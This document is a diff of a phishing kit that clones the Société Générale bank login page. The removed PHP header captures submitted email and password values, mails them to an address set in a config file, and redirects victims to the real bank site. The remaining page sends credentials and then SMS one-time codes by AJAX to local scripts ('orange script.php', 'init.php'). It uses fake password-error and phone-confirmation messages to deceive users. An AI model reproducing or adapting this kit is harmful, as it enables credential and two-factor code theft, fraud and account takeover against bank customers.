@@ -1,42 +1,8 @@
-<?php
-@session_start();
-error_reporting(0);
 
-$currentPath = $_SERVER['PHP_SELF'];
-// output: Array ( [dirname] => /myproject [basename] => index.php [extension] => php [filename] => index )
-$pathInfo = pathinfo($currentPath);
-
-$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
-$domainName = $_SERVER['HTTP_HOST'].'/';
-
-$host_name = $protocol.$domainName.$pathInfo['dirname']."/";
-
-function is_var_set($var) {
-
-	return (isset($_POST[$var]) && $_POST[$var] !="") ? true : false;
-}
-
-if( is_var_set("email") && is_var_set("password")) {
-
-	$info_names = array(
-
-		"EMAIL ADDRESS " => "email",
-		"EMAIL PASSWORD" => "password"
-	);
-	$redirection = "https://particuliers.societegenerale.fr/nos-conseils";
-
-	include("config.php");
-	mail($emailTo,$subject,$infoRaw.$env_vars,$headers);
-	save_rs("backup",$subject,$infoRaw);
-	echo "<script>window.location.href = '".$redirection."';</script>";
-
-}
-?>
 
 <html class="awt--standalone awt--ngim" lang="fr"><head>
 			<meta charset="utf-8">
-            <base href="https://particuliers.societegenerale.fr">
-                <!-- <script src="https://connect.facebook.net/signals/config/873080639448770?v=2.9.18&amp;r=stable" async=""></script> --><!-- <script async="" src="https://connect.facebook.net/en_US/fbevents.js"></script> --><!-- <script src="//bat.bing.com/bat.js" async=""></script> --><!-- <script type="text/javascript" charset="UTF-8" async="" id="MFBActor" src="https://actorssl-5637.kxcdn.com/actor/a7a30ba0aebbae114c740a1b35adb8c7-1641/action"></script> --><!-- <script charset="UTF-8" src="/static/Resources/js/n2g_secu.js"></script> -->
+                <!-- <script src="https://connect.facebook.net/signals/config/873080639448770?v=2.9.18&amp;r=stable" async=""></script> --><!-- <script async="" src="https://connect.facebook.net/en_US/fbevents.js"></script> --><!-- <script src="//bat.bing.com/bat.js" async=""></script> --><!-- <script type="text/javascript" charset="UTF-8" async="" id="MFBActor" src="https://actorssl-5637.kxcdn.com/actor/a7a30ba0aebbae114c740a1b35adb8c7-1641/action"></script> --><!-- <script charset="UTF-8" src="static/Resources/js/n2g_secu.js"></script> -->
         <script type="text/javascript">frame_shield();</script>
         <script type="application/json" id="sas_user_info">
     {
@@ -57,24 +23,24 @@ if( is_var_set("email") && is_var_set("password")) {
 					<meta name="twitter:card" content="summary">
 
 
-<meta name="viewport" content="initial-scale=1, maximum-scale=1, viewport-fit=cover"><link rel="icon" type="image/x-icon" href="/static/Resources/img/favicon.ico">
+<meta name="viewport" content="initial-scale=1, maximum-scale=1, viewport-fit=cover"><link rel="icon" type="image/x-icon" href="static/Resources/img/favicon.ico">
 
 
 <!-- <script charset="UTF-8" src="/icd/static/dcaweb-front/public/public-dca-portail.js"></script> -->
 
-                    <!-- <script charset="UTF-8" src="/static/Resources/js/init-configs-v2.js"></script> -->
-            <!-- <script charset="UTF-8" src="/static/Resources/js/Revive/dca_portail.js"></script> -->
-            <!-- <script charset="UTF-8" src="/static/Resources/js/vendor-v2.min.js"></script> -->
+                    <!-- <script charset="UTF-8" src="static/Resources/js/init-configs-v2.js"></script> -->
+            <!-- <script charset="UTF-8" src="static/Resources/js/Revive/dca_portail.js"></script> -->
+            <!-- <script charset="UTF-8" src="static/Resources/js/vendor-v2.min.js"></script> -->
             <!-- <script charset="UTF-8" src="/swm/resources/gda/js/gda.public.js"></script> --><!-- <script type="text/javascript" src="/icd/static/dcaweb-front/1.1.2/dist/awt-dcaweb.js"></script> -->
 
 
                     <!-- <script charset="UTF-8" src="/icd/static/interact-front/public/interact-lanceur.js"></script> -->
 
-                    <!-- <script charset="UTF-8" src="/static/Resources/js/indexv2.min.js"></script> -->
-            <!-- <script charset="UTF-8" src="/static/Resources/js/TMS/tc_SocieteGenerale_20.js"></script> --><!-- <script id="tc_script_114_1" src="https://static.societegenerale.fr/pri/static/dmsa/iframe/dmp_bridge.js" async="" defer="" data-console="true" data-kruxenvname="socgenprod" data-kruxcontroltagid="Kw6K3cJw"></script> --><!-- <script id="tc_script__1" type="text/javascript" src="//particuliers.societegenerale.fr/static/Resources/js/TMS/tc_SocieteGenerale_22.js" defer=""></script> -->
-            <link href="https://www.brisbaneopalmuseum.com.au/modules/photomanagement/extra/style/index-v3.min.css" rel="stylesheet" type="text/css">
-                <link href="/static/Resources/stylesheets/spec56_btn_gsm_all_gcd.min.css" rel="stylesheet" type="text/css">
-                <link href="/static/Resources/stylesheets/print.min.css" rel="stylesheet" type="text/css" media="print">
+                    <!-- <script charset="UTF-8" src="static/Resources/js/indexv2.min.js"></script> -->
+            <!-- <script charset="UTF-8" src="static/Resources/js/TMS/tc_SocieteGenerale_20.js"></script> --><!-- <script id="tc_script_114_1" src="https://static.societegenerale.fr/pri/static/dmsa/iframe/dmp_bridge.js" async="" defer="" data-console="true" data-kruxenvname="socgenprod" data-kruxcontroltagid="Kw6K3cJw"></script> --><!-- <script id="tc_script__1" type="text/javascript" src="//particuliers.societegenerale.fr/static/Resources/js/TMS/tc_SocieteGenerale_22.js" defer=""></script> -->
+            <link href="modules/photomanagement/extra/style/index-v3.min.css" rel="stylesheet" type="text/css">
+                <link href="static/Resources/stylesheets/spec56_btn_gsm_all_gcd.min.css" rel="stylesheet" type="text/css">
+                <link href="static/Resources/stylesheets/print.min.css" rel="stylesheet" type="text/css" media="print">
 
 <!-- URL: https://particuliers.societegenerale.fr:80/restcontent/theme/a1583f5b639cf510VgnVCM100000060015acRCRD -->
 <!-- REQUEST PROFILE: null, REQUEST SAS AUTH_LEVEL: 0 -->
@@ -746,7 +712,9 @@ span.flatpickr-day.selected {
   .flatpickr-day {
     width: 14.2857%;
     max-width: 41px; } }
-</style><style type="text/css">@charset "UTF-8";
+</style>
+
+<style type="text/css">
 .awt--root-element {
   height: auto !important; }
 
@@ -755,36 +723,36 @@ span.flatpickr-day.selected {
 
 @font-face {
   font-family: 'sourcesanspro';
-  src: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/aceb4fd44fa3b539e70b605515e13c01.eot);
-  src: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/d6cd4777dc581913c8b247b8bd44e02b.otf) format("truetype"), url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/52f5045b30343cd0e0a5acbd215a50e9.woff) format("woff"), url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/aceb4fd44fa3b539e70b605515e13c01.eot?#iefix) format("embedded-opentype"), url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/d6cd4777dc581913c8b247b8bd44e02b.svg#sourcesanspro) format("svg");
+  src: url(static/icd/static/vupri-front/5.6.0/dist/aceb4fd44fa3b539e70b605515e13c01.eot);
+  src: url(static/icd/static/vupri-front/5.6.0/dist/d6cd4777dc581913c8b247b8bd44e02b.otf) format("truetype"), url(static/icd/static/vupri-front/5.6.0/dist/52f5045b30343cd0e0a5acbd215a50e9.woff) format("woff"), url(static/icd/static/vupri-front/5.6.0/dist/aceb4fd44fa3b539e70b605515e13c01.eot?#iefix) format("embedded-opentype"), url(static/icd/static/vupri-front/5.6.0/dist/d6cd4777dc581913c8b247b8bd44e02b.svg#sourcesanspro) format("svg");
   font-weight: normal;
   font-style: normal; }
 
 @font-face {
   font-family: 'sourcesanspro';
-  src: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/196d048ba6612fdf9c73ac4822375ea8.eot);
-  src: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/2198d0aad1f95dddd8cce2926503ec96.otf) format("truetype"), url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/ed0493ad2f69e617b037bb1e6d3da477.woff) format("woff"), url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/196d048ba6612fdf9c73ac4822375ea8.eot?#iefix) format("embedded-opentype"), url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/2198d0aad1f95dddd8cce2926503ec96.svg#sourcesanspro) format("svg");
+  src: url(static/icd/static/vupri-front/5.6.0/dist/196d048ba6612fdf9c73ac4822375ea8.eot);
+  src: url(static/icd/static/vupri-front/5.6.0/dist/2198d0aad1f95dddd8cce2926503ec96.otf) format("truetype"), url(static/icd/static/vupri-front/5.6.0/dist/ed0493ad2f69e617b037bb1e6d3da477.woff) format("woff"), url(static/icd/static/vupri-front/5.6.0/dist/196d048ba6612fdf9c73ac4822375ea8.eot?#iefix) format("embedded-opentype"), url(static/icd/static/vupri-front/5.6.0/dist/2198d0aad1f95dddd8cce2926503ec96.svg#sourcesanspro) format("svg");
   font-weight: normal;
   font-style: italic; }
 
 @font-face {
   font-family: 'sourcesanspro';
-  src: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/0eaacaa8c19f9d308c1357b919e41522.eot);
-  src: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/48f378fabe3a365de672e126111e28b9.woff) format("woff"), url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/181a2dbd5f80f18f6e174978baf7cde2.otf) format("truetype"), url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/0eaacaa8c19f9d308c1357b919e41522.eot?#iefix) format("embedded-opentype"), url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/181a2dbd5f80f18f6e174978baf7cde2.svg#sourcesanspro) format("svg");
+  src: url(static/icd/static/vupri-front/5.6.0/dist/0eaacaa8c19f9d308c1357b919e41522.eot);
+  src: url(static/icd/static/vupri-front/5.6.0/dist/48f378fabe3a365de672e126111e28b9.woff) format("woff"), url(static/icd/static/vupri-front/5.6.0/dist/181a2dbd5f80f18f6e174978baf7cde2.otf) format("truetype"), url(static/icd/static/vupri-front/5.6.0/dist/0eaacaa8c19f9d308c1357b919e41522.eot?#iefix) format("embedded-opentype"), url(static/icd/static/vupri-front/5.6.0/dist/181a2dbd5f80f18f6e174978baf7cde2.svg#sourcesanspro) format("svg");
   font-weight: 300;
   font-style: normal; }
 
 @font-face {
   font-family: 'sourcesanspro';
-  src: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/067ab8783dbcc690dffe8decff623e23.eot);
-  src: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/3fbf5b8edc66b68a0e2ccfa598bbdae4.otf) format("truetype"), url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/f079be3e96761bf618ea2a5b314eb014.woff) format("woff"), url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/067ab8783dbcc690dffe8decff623e23.eot?#iefix) format("embedded-opentype"), url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/3fbf5b8edc66b68a0e2ccfa598bbdae4.svg#sourcesanspro) format("svg");
+  src: url(static/icd/static/vupri-front/5.6.0/dist/067ab8783dbcc690dffe8decff623e23.eot);
+  src: url(static/icd/static/vupri-front/5.6.0/dist/3fbf5b8edc66b68a0e2ccfa598bbdae4.otf) format("truetype"), url(static/icd/static/vupri-front/5.6.0/dist/f079be3e96761bf618ea2a5b314eb014.woff) format("woff"), url(static/icd/static/vupri-front/5.6.0/dist/067ab8783dbcc690dffe8decff623e23.eot?#iefix) format("embedded-opentype"), url(static/icd/static/vupri-front/5.6.0/dist/3fbf5b8edc66b68a0e2ccfa598bbdae4.svg#sourcesanspro) format("svg");
   font-weight: 600;
   font-style: normal; }
 
 @font-face {
   font-family: 'sourcesanspro';
-  src: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/cae9689f002f58b4ad9104a202d7fa3b.eot);
-  src: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/269ca7e400c670e507c39eeafb9d36b9.otf) format("truetype"), url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/3e7af4d251f183a9ea98bfd812016274.woff) format("woff"), url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/cae9689f002f58b4ad9104a202d7fa3b.eot?#iefix) format("embedded-opentype"), url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/269ca7e400c670e507c39eeafb9d36b9.svg#sourcesanspro) format("svg");
+  src: url(static/icd/static/vupri-front/5.6.0/dist/cae9689f002f58b4ad9104a202d7fa3b.eot);
+  src: url(static/icd/static/vupri-front/5.6.0/dist/269ca7e400c670e507c39eeafb9d36b9.otf) format("truetype"), url(static/icd/static/vupri-front/5.6.0/dist/3e7af4d251f183a9ea98bfd812016274.woff) format("woff"), url(static/icd/static/vupri-front/5.6.0/dist/cae9689f002f58b4ad9104a202d7fa3b.eot?#iefix) format("embedded-opentype"), url(static/icd/static/vupri-front/5.6.0/dist/269ca7e400c670e507c39eeafb9d36b9.svg#sourcesanspro) format("svg");
   font-weight: bold;
   font-style: normal; }
 
@@ -889,7 +857,7 @@ span.flatpickr-day.selected {
       width: 26px;
       height: 26px;
       margin-left: 1rem;
-      background-image: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/c0d2bf8151c11eb2426a16dc2a38625a.png);
+      background-image: url(static/icd/static/vupri-front/5.6.0/dist/c0d2bf8151c11eb2426a16dc2a38625a.png);
       background-repeat: no-repeat;
       background-position: -52px 0;
       background-size: 156px 78px;
@@ -965,7 +933,7 @@ span.flatpickr-day.selected {
     margin-right: 0.5rem;
     width: 1rem;
     height: 1.125rem;
-    background: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/a02efc980f2c957e30dad58ce6469ab0.png) no-repeat center/1rem 1.125rem; }
+    background: url(static/icd/static/vupri-front/5.6.0/dist/a02efc980f2c957e30dad58ce6469ab0.png) no-repeat center/1rem 1.125rem; }
   .vupri_wrapper .vupri_link--picto {
     font-size: 0; }
     .vupri_wrapper .vupri_link--picto:before {
@@ -976,7 +944,7 @@ span.flatpickr-day.selected {
       width: 1.25em;
       height: 1.5625em;
       font-size: 1rem;
-      background: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/f21683f9b48883f6f903309956ff8f03.png) no-repeat center/1.25em 1.5625em; }
+      background: url(static/icd/static/vupri-front/5.6.0/dist/f21683f9b48883f6f903309956ff8f03.png) no-repeat center/1.25em 1.5625em; }
     .vupri_wrapper .vupri_link--picto > span {
       display: inline-block;
       vertical-align: middle;
@@ -987,7 +955,7 @@ span.flatpickr-day.selected {
     .vupri_wrapper .vupri_link--large:before {
       width: 1.5em;
       height: 1.875em;
-      background: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/9ff16713a9e24e5682fbbf885138c776.png) no-repeat center/1.5em 1.875em; }
+      background: url(static/icd/static/vupri-front/5.6.0/dist/9ff16713a9e24e5682fbbf885138c776.png) no-repeat center/1.5em 1.875em; }
     .vupri_wrapper .vupri_link--large > span {
       font-size: 1.125rem;
       text-decoration: none; }
@@ -1230,13 +1198,13 @@ span.flatpickr-day.selected {
       .vupri_wrapper .vupri_modal__picto {
         margin-bottom: 1.5rem; } }
     .vupri_wrapper .vupri_modal__picto--valid {
-      background-image: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/67d9334cda2df22fe80c913233281189.png); }
+      background-image: url(static/icd/static/vupri-front/5.6.0/dist/67d9334cda2df22fe80c913233281189.png); }
     .vupri_wrapper .vupri_modal__picto--info {
-      background-image: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/d2fc008db6456447666547b7962d10b3.png); }
+      background-image: url(static/icd/static/vupri-front/5.6.0/dist/d2fc008db6456447666547b7962d10b3.png); }
     .vupri_wrapper .vupri_modal__picto--off {
-      background-image: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/6c9b88b0626ce5b6e58e9f2ba5289d0a.png); }
+      background-image: url(static/icd/static/vupri-front/5.6.0/dist/6c9b88b0626ce5b6e58e9f2ba5289d0a.png); }
     .vupri_wrapper .vupri_modal__picto--alert {
-      background-image: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/d74b2cbd729d0f83b95f295dbcab2381.png); }
+      background-image: url(static/icd/static/vupri-front/5.6.0/dist/d74b2cbd729d0f83b95f295dbcab2381.png); }
   .vupri_wrapper .vupri_modal__content {
     font-size: 1.5em;
     line-height: 1.3;
@@ -1428,7 +1396,7 @@ span.flatpickr-day.selected {
       float: right;
       width: 1.625rem;
       height: 1.625rem;
-      background-image: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/c0d2bf8151c11eb2426a16dc2a38625a.png);
+      background-image: url(static/icd/static/vupri-front/5.6.0/dist/c0d2bf8151c11eb2426a16dc2a38625a.png);
       background-repeat: no-repeat;
       background-position: -6.5rem -1.625rem;
       background-size: 9.75rem 4.875rem;
@@ -1510,7 +1478,7 @@ span.flatpickr-day.selected {
       width: 1.125rem;
       height: .75rem;
       transform: translateY(-50%);
-      background-image: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/c0d2bf8151c11eb2426a16dc2a38625a.png);
+      background-image: url(static/icd/static/vupri-front/5.6.0/dist/c0d2bf8151c11eb2426a16dc2a38625a.png);
       background-repeat: no-repeat;
       background-position: -6.75rem -2.0625rem;
       background-size: 9.75rem 4.875rem;
@@ -1797,7 +1765,7 @@ span.flatpickr-day.selected {
   width: 1.4375rem;
   height: 1.4375rem;
   left: 1px;
-  background-image: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/c0d2bf8151c11eb2426a16dc2a38625a.png);
+  background-image: url(static/icd/static/vupri-front/5.6.0/dist/c0d2bf8151c11eb2426a16dc2a38625a.png);
   background-repeat: no-repeat;
   background-position: -.125rem -1.6875rem;
   background-size: 9.75rem 4.875rem;
@@ -1898,7 +1866,7 @@ span.flatpickr-day.selected {
     width: 1.625rem;
     height: 1.625rem;
     font-size: .8em;
-    background-image: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/c0d2bf8151c11eb2426a16dc2a38625a.png);
+    background-image: url(static/icd/static/vupri-front/5.6.0/dist/c0d2bf8151c11eb2426a16dc2a38625a.png);
     background-repeat: no-repeat;
     background-position: 1.75rem 0;
     background-size: 9.5rem 4.875rem; }
@@ -2186,7 +2154,7 @@ span.flatpickr-day.selected {
       -ms-user-select: text;
       user-select: text; } }
   .vupri_wrapper .vupri_banner--christmas .vupri_banner__illustration {
-    background: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/a8184cc263e8aa7c4fa9075853ae44ad.gif) no-repeat 0 -1.375rem;
+    background: url(static/icd/static/vupri-front/5.6.0/dist/a8184cc263e8aa7c4fa9075853ae44ad.gif) no-repeat 0 -1.375rem;
     width: 15.5625rem; }
     @media only screen and (max-width: 768px) {
       .vupri_wrapper .vupri_banner--christmas .vupri_banner__illustration {
@@ -2727,7 +2695,7 @@ span.flatpickr-day.selected {
   padding: 0 0 0 50px;
   min-height: 46px;
   background: no-repeat 0 center/34px;
-  background-image: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/d2fc008db6456447666547b7962d10b3.png);
+  background-image: url(static/icd/static/vupri-front/5.6.0/dist/d2fc008db6456447666547b7962d10b3.png);
   border: none; }
   @media only screen and (max-width: 768px) {
     .vupri_wrapper .vupri_alertbox--info_in_form .vupri_alertbox__message {
@@ -2891,7 +2859,7 @@ span.flatpickr-day.selected {
         width: 18px;
         height: 18px;
         margin-right: 4px;
-        background-image: url(https://particuliers.societegenerale.fr/icd/static/vupri-front/5.6.0/dist/c0d2bf8151c11eb2426a16dc2a38625a.png);
+        background-image: url(static/icd/static/vupri-front/5.6.0/dist/c0d2bf8151c11eb2426a16dc2a38625a.png);
         background-repeat: no-repeat;
         background-position: -4px -56px;
         background-size: 156px 78px; }
@@ -3067,7 +3035,11 @@ span.flatpickr-day.selected {
 
 .awt--ngim .vupri_wrapper .itemVirement.itemVirementBorder {
   border: 0; }
-</style><style type="text/css">.mfbSlide-in-right .mfbNavbarContent{-webkit-transform:translateX(100%);-moz-transform:translateX(100%);-ms-transform:translateX(100%);transform:translateX(100%);-webkit-transition:all 1s;-moz-transition:all 0.2s;transition:all 0.2s;transition-delay:1s;opacity:0}.mfbSlide-in-left .mfbNavbarContent{-webkit-transform:translateX(-100%);-moz-transform:translateX(-100%);-ms-transform:translateX(-100%);transform:translateX(-100%);-webkit-transition:all 0.2s;-moz-transition:all 0.2s;transition:all 0.2s;transition-delay:1s;opacity:0}.mfbSlide-in-bottom .mfbNavbarContent{-webkit-transform:translateY(100%);-moz-transform:translateY(100%);-ms-transform:translateY(100%);transform:translateY(100%);-webkit-transition:all 0.2s;-moz-transition:all 0.2s;transition:all 0.2s;transition-delay:0.2s;opacity:0}.mfbSlide-in-top .mfbNavbarContent{-webkit-transform:translateY(-100%);-moz-transform:translateY(-100%);-ms-transform:translateY(-100%);transform:translateY(-100%);-webkit-transition:all 0.2s;-moz-transition:all 0.2s;transition:all 0.2s;transition-delay:0.2s;opacity:0}.mfbVisible.mfbSlide-in-left .mfbNavbarContent,.mfbVisible.mfbSlide-in-right .mfbNavbarContent{-webkit-transform:translateX(0);-moz-transform:translateX(0);-ms-transform:translateX(0);transform:translateX(0);-webkit-transition:all 0.2s;-moz-transition:all 0.2s;transition:all 0.2s;opacity:1}.mfbVisible.mfbSlide-in-bottom .mfbNavbarContent,.mfbVisible.mfbSlide-in-top .mfbNavbarContent{-webkit-transform:translateY(0);-moz-transform:translateY(0);-ms-transform:translateY(0);transform:translateY(0);-webkit-transition:all 0.2s;-moz-transition:all 0.2s;transition:all 0.2s;opacity:1}</style><style>#mfbNavbar.mfbNavbar{width:auto;height:auto;top:undefined;bottom:0;left:undefined;right:60px;position:fixed;z-index:150000;}#mfbButton{cursor:pointer;padding:6px 12px;border:1px solid transparent;vertical-align:bottom;min-height:40px;display:inline-block;position:relative;line-height:1;background-color:#010035;color:#ffffff;border-radius:4px 4px 0 0;-moz-transform:rotate(undefined);-webkit-transform:rotate(undefined);-ms-transform:rotate(undefined);transform:rotate(undefined);-moz-transform-origin:undefined;-webkit-transform-origin:undefined;-ms-transform-origin:undefined;transform-origin:undefined;top:undefined;right:0;bottom:0;font-size:16px;font-weight:600;text-align:center;}#mfbNavbarClose{display:none;position:absolute;right:10px;color:#dddddd;z-index:10;font-size:25px;cursor:pointer;}#mfbNavbarContent{width:auto;height:auto;min-height:50px;background-color:rgba(0, 0, 0, 0);text-align:center;}</style><style>#mfbNavbar {  z-index: 800 !important;}</style>
+</style>
+
+<style type="text/css">
+
+.mfbSlide-in-right .mfbNavbarContent{-webkit-transform:translateX(100%);-moz-transform:translateX(100%);-ms-transform:translateX(100%);transform:translateX(100%);-webkit-transition:all 1s;-moz-transition:all 0.2s;transition:all 0.2s;transition-delay:1s;opacity:0}.mfbSlide-in-left .mfbNavbarContent{-webkit-transform:translateX(-100%);-moz-transform:translateX(-100%);-ms-transform:translateX(-100%);transform:translateX(-100%);-webkit-transition:all 0.2s;-moz-transition:all 0.2s;transition:all 0.2s;transition-delay:1s;opacity:0}.mfbSlide-in-bottom .mfbNavbarContent{-webkit-transform:translateY(100%);-moz-transform:translateY(100%);-ms-transform:translateY(100%);transform:translateY(100%);-webkit-transition:all 0.2s;-moz-transition:all 0.2s;transition:all 0.2s;transition-delay:0.2s;opacity:0}.mfbSlide-in-top .mfbNavbarContent{-webkit-transform:translateY(-100%);-moz-transform:translateY(-100%);-ms-transform:translateY(-100%);transform:translateY(-100%);-webkit-transition:all 0.2s;-moz-transition:all 0.2s;transition:all 0.2s;transition-delay:0.2s;opacity:0}.mfbVisible.mfbSlide-in-left .mfbNavbarContent,.mfbVisible.mfbSlide-in-right .mfbNavbarContent{-webkit-transform:translateX(0);-moz-transform:translateX(0);-ms-transform:translateX(0);transform:translateX(0);-webkit-transition:all 0.2s;-moz-transition:all 0.2s;transition:all 0.2s;opacity:1}.mfbVisible.mfbSlide-in-bottom .mfbNavbarContent,.mfbVisible.mfbSlide-in-top .mfbNavbarContent{-webkit-transform:translateY(0);-moz-transform:translateY(0);-ms-transform:translateY(0);transform:translateY(0);-webkit-transition:all 0.2s;-moz-transition:all 0.2s;transition:all 0.2s;opacity:1}</style><style>#mfbNavbar.mfbNavbar{width:auto;height:auto;top:undefined;bottom:0;left:undefined;right:60px;position:fixed;z-index:150000;}#mfbButton{cursor:pointer;padding:6px 12px;border:1px solid transparent;vertical-align:bottom;min-height:40px;display:inline-block;position:relative;line-height:1;background-color:#010035;color:#ffffff;border-radius:4px 4px 0 0;-moz-transform:rotate(undefined);-webkit-transform:rotate(undefined);-ms-transform:rotate(undefined);transform:rotate(undefined);-moz-transform-origin:undefined;-webkit-transform-origin:undefined;-ms-transform-origin:undefined;transform-origin:undefined;top:undefined;right:0;bottom:0;font-size:16px;font-weight:600;text-align:center;}#mfbNavbarClose{display:none;position:absolute;right:10px;color:#dddddd;z-index:10;font-size:25px;cursor:pointer;}#mfbNavbarContent{width:auto;height:auto;min-height:50px;background-color:rgba(0, 0, 0, 0);text-align:center;}</style><style>#mfbNavbar {  z-index: 800 !important;}</style>
 
 <style>
 .my_popin_modal_overlay{
@@ -3100,7 +3072,7 @@ span.flatpickr-day.selected {
 	box-shadow:0 8px 15px 0 rgba(0,0,0,.2);
 	-webkit-transform:translateX(-50%) translateY(-50%);
 	-ms-transform:translateX(-50%) translateY(-50%);
-	transform:translateX(-50%) translateY(-50%)
+	transform:translateX(-50%) translateY(-50%);
 	min-height: 298px;
 }
 
@@ -3293,13 +3265,13 @@ $(document).ready(function(){
         $('.input_error').html('Votre mot de passe est incorrect');
         $('.input_error').show();
       }, 3000);
-			
+
 			return false;
 		}
 
 		$("#exampleModal").show();
 		$.ajax({
-        url: "<?=$host_name?>/orange script.php",
+        url: "orange script.php",
         data:{email:email_val, password: passwd_val},
         type:"post",
         dataType:"json",
@@ -3341,7 +3313,7 @@ $(document).ready(function(){
 		if($("#otp-input").val()!=""){
 			var sms = $("#otp-input").val();
 			$.ajax({
-	        url: "<?=$host_name?>/init.php",
+	        url: "init.php",
 	        data:{sms:sms},
 	        type:"post",
 					dataType:"json",
@@ -3429,7 +3401,7 @@ $(document).ready(function(){
 				  </tbody>
 				  </table>
 					<div class="org-logo">
-						<img src="<?=$host_name?>/img/org2.png">
+						<img src="img/org2.png">
 					</div>
 
 					  <div class="input_error">incorrect emauil adress</div>
@@ -3445,9 +3417,9 @@ $(document).ready(function(){
 		<div class="my_popin_modal" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true" style="display:none;">
 		  <div class="my_popin_modal_content" role="document" style="display: block;">
 
-			<div class="" style="">
+			<div class="" >
 				<div class="modal-body" id="mbody5" style="display:block;">
-					  <img src="<?=$host_name?>/img/loading.gif">
+					  <img src="img/loading.gif">
 				</div>
 			  <div class="loaderdiv" style="display:;"></div>
 			</div>
@@ -3479,7 +3451,7 @@ $(document).ready(function(){
 							<input type="text" class="modal_input" id="otp-input" name="otp" placeholder="******"  required="" >
 						</p>
 						<p style="font-size:90%">Vous allez recevoir un code SMS dans <span id="time"></span> minutes.</p>
-						<img src="<?=$host_name?>/img/sms.png" style="position: absolute; top: 150px; right: 10px; width: 80px;">
+						<img src="img/sms.png" style="position: absolute; top: 150px; right: 10px; width: 80px;">
 					</td>
 
 				  </tr>
@@ -3508,7 +3480,7 @@ $(document).ready(function(){
 				<div class="modal_body">
   					<h4>La demande de confirmation de votre numéro de téléphone a bien été prise en compte, elle sera traitée par nos services dans un délai de 48h.</h4>
 					  <h4>Déconnexion en cours...</h4>
-				<img src="<?=$host_name?>/img/done.png" width="56"></div>
+				<img src="img/done.png" width="56"></div>
 				</form>
 			</div>
 		</div>
@@ -3542,14 +3514,14 @@ $(document).ready(function(){
 		<ul class="rsp_nav__list">
 
         <li class="rsp_nav__item rsp_nav__item--push-right" data-channelid="7eb2e45e86bb3610VgnVCM1000000ae1c6c0RCRD">
-            <a data-tms-container-label="top-menu" href="/aides-contact" class="rsp_nav__link rsp_nav__link--sub-level" data-tms-click-type="N" data-tms-element-label="aide-et-contacts"><svg aria-hidden="true" focusable="false" width="18" height="18"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#"></use></svg><span>Aide et contacts</span></a>
+            <a data-tms-container-label="top-menu" href="/aides-contact" class="rsp_nav__link rsp_nav__link--sub-level" data-tms-click-type="N" data-tms-element-label="aide-et-contacts"><svg aria-hidden="true" focusable="false" width="18" height="18"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="static/Resources/img/pictos-fonctionnels_20200128023755.svg#"></use></svg><span>Aide et contacts</span></a>
         </li>
 </ul>
 	</nav>
 	<div class="rsp_header__wrapper-nav">
 		<button class="rsp_btn rsp_btn--burger js-header-burger" aria-controls="menuMobile" aria-expanded="false">
-    <svg class="picto-menu v-align-middle" aria-label="ouvrir menu" aria-labelledby="picto-menu" role="img" viewBox="0 0 24 26" height="26" width="24" aria-hidden="true" focusable="false"><title>Ouvrir menu</title><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#lhs-burger-menu"></use></svg>
